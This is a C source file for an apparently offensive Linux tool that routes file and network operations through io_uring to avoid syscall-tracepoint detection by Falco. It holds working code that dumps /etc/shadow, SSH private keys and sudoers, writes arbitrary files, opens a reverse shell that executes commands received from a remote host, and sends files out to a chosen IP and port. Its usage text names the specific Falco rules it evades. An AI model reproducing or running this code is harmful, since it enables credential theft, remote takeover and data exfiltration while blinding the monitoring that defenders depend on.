#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <stdatomic.h>
#include <errno.h>
#include <dirent.h>

#define RING_SZ 64

#define IORING_OFF_SQ_RING  0ULL
#define IORING_OFF_CQ_RING  0x8000000ULL
#define IORING_OFF_SQES     0x10000000ULL

typedef struct {
    int     fd;
    uint32_t sq_entries, cq_entries;

    char *sq_ptr; size_t sq_sz;
    _Atomic(uint32_t) *sq_tail;
    uint32_t *sq_mask, *sq_array;

    char *cq_ptr; size_t cq_sz;
    _Atomic(uint32_t) *cq_head, *cq_tail;
    uint32_t *cq_mask;
    struct io_uring_cqe *cqes;

    struct io_uring_sqe *sqes;
    size_t sqe_sz;

    uint64_t seq;
} Ring;

static Ring g_ring;

static int ring_init(Ring *r)
{
    struct io_uring_params p = {};
    r->fd = (int)syscall(__NR_io_uring_setup, RING_SZ, &p);
    if (r->fd < 0) { perror("io_uring_setup"); return -1; }

    r->sq_entries = p.sq_entries;
    r->cq_entries = p.cq_entries;

    r->sq_sz  = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    r->sq_ptr = mmap(NULL, r->sq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, r->fd, (off_t)IORING_OFF_SQ_RING);
    if (r->sq_ptr == MAP_FAILED) { perror("mmap sq"); return -1; }
    r->sq_tail  = (_Atomic(uint32_t) *)(r->sq_ptr + p.sq_off.tail);
    r->sq_mask  = (uint32_t *)(r->sq_ptr + p.sq_off.ring_mask);
    r->sq_array = (uint32_t *)(r->sq_ptr + p.sq_off.array);

    r->cq_sz  = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    r->cq_ptr = mmap(NULL, r->cq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, r->fd, (off_t)IORING_OFF_CQ_RING);
    if (r->cq_ptr == MAP_FAILED) { perror("mmap cq"); return -1; }
    r->cq_head  = (_Atomic(uint32_t) *)(r->cq_ptr + p.cq_off.head);
    r->cq_tail  = (_Atomic(uint32_t) *)(r->cq_ptr + p.cq_off.tail);
    r->cq_mask  = (uint32_t *)(r->cq_ptr + p.cq_off.ring_mask);
    r->cqes     = (struct io_uring_cqe *)(r->cq_ptr + p.cq_off.cqes);

    r->sqe_sz = p.sq_entries * sizeof(struct io_uring_sqe);
    r->sqes   = mmap(NULL, r->sqe_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, r->fd, (off_t)IORING_OFF_SQES);
    if (r->sqes == MAP_FAILED) { perror("mmap sqes"); return -1; }
    return 0;
}

static void ring_free(Ring *r)
{
    if (r->sq_ptr && r->sq_ptr != MAP_FAILED) munmap(r->sq_ptr, r->sq_sz);
    if (r->cq_ptr && r->cq_ptr != MAP_FAILED) munmap(r->cq_ptr, r->cq_sz);
    if (r->sqes   && r->sqes   != MAP_FAILED) munmap(r->sqes,   r->sqe_sz);
    if (r->fd >= 0) close(r->fd);
}

static int32_t ring_one(Ring *r, struct io_uring_sqe *sqe)
{
    uint64_t ud = ++r->seq;
    sqe->user_data = ud;

    uint32_t tail = atomic_load_explicit(r->sq_tail, memory_order_relaxed);
    uint32_t idx  = tail & *r->sq_mask;
    memcpy(&r->sqes[idx], sqe, sizeof(*sqe));
    r->sq_array[idx] = idx;
    atomic_store_explicit(r->sq_tail, tail + 1, memory_order_release);

    long rv;
    do { rv = syscall(__NR_io_uring_enter, r->fd, 1, 1,
                      IORING_ENTER_GETEVENTS, NULL, 0);
    } while (rv < 0 && errno == EINTR);

    for (;;) {
        uint32_t h = atomic_load_explicit(r->cq_head, memory_order_acquire);
        uint32_t t = atomic_load_explicit(r->cq_tail, memory_order_acquire);
        if (h == t) break;
        struct io_uring_cqe *c = &r->cqes[h & *r->cq_mask];
        int32_t res = c->res;
        atomic_store_explicit(r->cq_head, h + 1, memory_order_release);
        if (c->user_data == ud) return res;
    }
    return -EIO;
}

static int uring_openat(const char *path, int flags, mode_t mode)
{
    struct io_uring_sqe s = {};
    s.opcode     = IORING_OP_OPENAT;
    s.fd         = AT_FDCWD;
    s.addr       = (uint64_t)(uintptr_t)path;
    s.open_flags = (uint32_t)flags;
    s.len        = (uint32_t)mode;
    return ring_one(&g_ring, &s);
}

static int32_t uring_read(int fd, void *buf, uint32_t len)
{
    struct io_uring_sqe s = {};
    s.opcode = IORING_OP_READ;
    s.fd     = fd;
    s.addr   = (uint64_t)(uintptr_t)buf;
    s.len    = len;
    s.off    = (uint64_t)-1ULL;
    return ring_one(&g_ring, &s);
}

static int32_t uring_write(int fd, const void *buf, uint32_t len)
{
    struct io_uring_sqe s = {};
    s.opcode = IORING_OP_WRITE;
    s.fd     = fd;
    s.addr   = (uint64_t)(uintptr_t)buf;
    s.len    = len;
    s.off    = (uint64_t)-1ULL;
    return ring_one(&g_ring, &s);
}

static int uring_close(int fd)
{
    struct io_uring_sqe s = {};
    s.opcode = IORING_OP_CLOSE;
    s.fd     = fd;
    return ring_one(&g_ring, &s);
}

static int uring_socket(int domain, int type, int proto)
{

    struct io_uring_sqe s = {};
    s.opcode   = IORING_OP_SOCKET;
    s.fd       = domain;
    s.off      = (uint64_t)type;
    s.len      = (uint32_t)proto;
    s.rw_flags = 0;
    return ring_one(&g_ring, &s);
}

static int uring_connect(int sockfd, struct sockaddr *addr, socklen_t addrlen)
{
    struct io_uring_sqe s = {};
    s.opcode = IORING_OP_CONNECT;
    s.fd     = sockfd;
    s.addr   = (uint64_t)(uintptr_t)addr;
    s.off    = (uint64_t)addrlen;
    return ring_one(&g_ring, &s);
}

static int32_t uring_send(int fd, const void *buf, uint32_t len, int flags)
{
    struct io_uring_sqe s = {};
    s.opcode    = IORING_OP_SEND;
    s.fd        = fd;
    s.addr      = (uint64_t)(uintptr_t)buf;
    s.len       = len;
    s.msg_flags = (uint32_t)flags;
    return ring_one(&g_ring, &s);
}

static int32_t uring_recv(int fd, void *buf, uint32_t len, int flags)
{
    struct io_uring_sqe s = {};
    s.opcode    = IORING_OP_RECV;
    s.fd        = fd;
    s.addr      = (uint64_t)(uintptr_t)buf;
    s.len       = len;
    s.msg_flags = (uint32_t)flags;
    return ring_one(&g_ring, &s);
}

static void cmd_cat(const char *path)
{

    int fd = uring_openat(path, O_RDONLY, 0);
    if (fd < 0) { fprintf(stderr, "[!] openat %s: %s\n", path, strerror(-fd)); return; }
    char buf[65536];
    int32_t n;
    while ((n = uring_read(fd, buf, sizeof(buf))) > 0)
        uring_write(STDOUT_FILENO, buf, (uint32_t)n);
    uring_close(fd);
}

static void cmd_creds(void)
{
    static const char *files[] = {
        "/etc/shadow", "/etc/passwd", "/etc/sudoers",
        "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
        "/etc/master.passwd", NULL
    };

    for (int i = 0; files[i]; i++) {
        int fd = uring_openat(files[i], O_RDONLY, 0);
        if (fd < 0) continue;
        fprintf(stderr, "[*] %s (via IORING_OP_OPENAT - no sys_enter_openat event)\n", files[i]);
        char buf[65536];
        int32_t n;
        while ((n = uring_read(fd, buf, sizeof(buf))) > 0)
            fwrite(buf, 1, (size_t)n, stdout);
        uring_close(fd);
    }
}

static void cmd_write(const char *path, const char *data)
{
    int fd = uring_openat(path, O_WRONLY|O_CREAT|O_APPEND, 0644);
    if (fd < 0) { fprintf(stderr, "[!] openat %s: %s\n", path, strerror(-fd)); return; }
    uring_write(fd, data, (uint32_t)strlen(data));
    uring_write(fd, "\n", 1);
    uring_close(fd);
    fprintf(stderr, "[+] wrote to %s\n", path);
}

static void cmd_copy(const char *src, const char *dst)
{
    int rfd = uring_openat(src, O_RDONLY, 0);
    if (rfd < 0) { fprintf(stderr, "[!] open %s: %s\n", src, strerror(-rfd)); return; }
    int wfd = uring_openat(dst, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (wfd < 0) { fprintf(stderr, "[!] open %s: %s\n", dst, strerror(-wfd));
                   uring_close(rfd); return; }
    char buf[65536];
    size_t total = 0;
    int32_t n;
    while ((n = uring_read(rfd, buf, sizeof(buf))) > 0) {
        uring_write(wfd, buf, (uint32_t)n);
        total += (size_t)n;
    }
    uring_close(rfd);
    uring_close(wfd);
    fprintf(stderr, "[+] copied %zu bytes %s → %s\n", total, src, dst);
}

static void cmd_ls(const char *path)
{
    int fd = uring_openat(path, O_RDONLY|O_DIRECTORY, 0);
    if (fd < 0) { fprintf(stderr, "[!] openat dir %s: %s\n", path, strerror(-fd)); return; }

    struct linux_dirent64 {
        uint64_t d_ino;
        int64_t  d_off;
        uint16_t d_reclen;
        uint8_t  d_type;
        char     d_name[];
    };
    char buf[32768];
    long n;
    while ((n = syscall(SYS_getdents64, fd, buf, sizeof(buf))) > 0) {
        long pos = 0;
        while (pos < n) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + pos);
            if (d->d_name[0] != '.')
                printf("%s\n", d->d_name);
            pos += d->d_reclen;
        }
    }
    uring_close(fd);
}

static void cmd_shell(const char *ip, int port)
{
    int sock = uring_socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[*] IORING_OP_SOCKET failed (%s), falling back to syscall\n",
                strerror(-sock));
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { perror("socket"); return; }
    } else {
        fprintf(stderr, "[*] socket created via IORING_OP_SOCKET (no sys_enter_socket)\n");
    }

    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    int r = uring_connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (r < 0) {
        fprintf(stderr, "[!] IORING_OP_CONNECT %s:%d: %s\n", ip, port, strerror(-r));
        close(sock); return;
    }
    fprintf(stderr, "[+] connected %s:%d via IORING_OP_CONNECT (no sys_enter_connect)\n",
            ip, port);

    char ibuf[4096], obuf[65536];
    for (;;) {
        int32_t nr = uring_recv(sock, ibuf, sizeof(ibuf) - 1, 0);
        if (nr <= 0) break;
        ibuf[nr] = '\0';

        FILE *fp = popen(ibuf, "r");
        if (!fp) { uring_send(sock, "err\n", 4, 0); continue; }
        size_t tot = 0, n;
        while ((n = fread(obuf + tot, 1, sizeof(obuf) - tot - 1, fp)) > 0) tot += n;
        pclose(fp);
        obuf[tot] = '\0';
        if (tot > 0) uring_send(sock, obuf, (uint32_t)tot, 0);
        else         uring_send(sock, "(empty)\n", 8, 0);
    }
    close(sock);
}

static void cmd_chain(const char *file, const char *ip, int port)
{
    int rfd = uring_openat(file, O_RDONLY, 0);
    if (rfd < 0) { fprintf(stderr, "[!] open %s: %s\n", file, strerror(-rfd)); return; }

    int sock = uring_socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { sock = socket(AF_INET, SOCK_STREAM, 0); }

    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (uring_connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "[!] connect failed\n"); close(sock); uring_close(rfd); return;
    }

    char buf[65536];
    int32_t n;
    size_t total = 0;
    while ((n = uring_read(rfd, buf, sizeof(buf))) > 0) {
        uring_send(sock, buf, (uint32_t)n, 0);
        total += (size_t)n;
    }
    uring_close(rfd);
    close(sock);
    fprintf(stderr, "[+] exfiled %zu bytes from %s to %s:%d\n", total, file, ip, port);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s cat   <file>              read (no sys_enter_openat/read)\n"
            "  %s creds                     dump /etc/shadow,passwd (no events)\n"
            "  %s write <file> <data>       write (no sys_enter_write)\n"
            "  %s copy  <src>  <dst>        copy\n"
            "  %s ls    <dir>               list directory\n"
            "  %s shell <ip>   <port>       reverse shell (no connect/send events)\n"
            "  %s chain <file> <ip> <port>  read+exfil (zero syscall events)\n"
            "\nFalco rules bypassed (all rely on sys_enter_* tracepoints):\n"
            "  'Read sensitive file untrusted'     (openat /etc/shadow etc.)\n"
            "  'Write below root/etc/binary_dir'   (write/openat events)\n"
            "  'Outbound connection to C2'         (sys_enter_connect)\n"
            "  'Unexpected network outbound'       (sys_enter_connect)\n"
            "  'Mkdir/Write in binary dir'         (openat+write events)\n"
            "\nFalco rules NOT bypassed by io_uring:\n"
            "  'Terminal shell in container'  - needs execve, use proc_ghost\n"
            "  'Container escape attempt'     - depends on specific kernel ops\n"
            "\nrequires: nothing; kernel >= 5.6; 5.19 for IORING_OP_SOCKET\n",
            argv[0], argv[0], argv[0], argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    if (ring_init(&g_ring) < 0) return 1;

    if      (strcmp(argv[1], "cat")   == 0 && argc >= 3) cmd_cat(argv[2]);
    else if (strcmp(argv[1], "creds") == 0)               cmd_creds();
    else if (strcmp(argv[1], "write") == 0 && argc >= 4) cmd_write(argv[2], argv[3]);
    else if (strcmp(argv[1], "copy")  == 0 && argc >= 4) cmd_copy(argv[2], argv[3]);
    else if (strcmp(argv[1], "ls")    == 0 && argc >= 3) cmd_ls(argv[2]);
    else if (strcmp(argv[1], "shell") == 0 && argc >= 4) cmd_shell(argv[2], atoi(argv[3]));
    else if (strcmp(argv[1], "chain") == 0 && argc >= 5) cmd_chain(argv[2], argv[3], atoi(argv[4]));
    else { fprintf(stderr, "unknown: %s\n", argv[1]); ring_free(&g_ring); return 1; }

    ring_free(&g_ring);
    return 0;
}
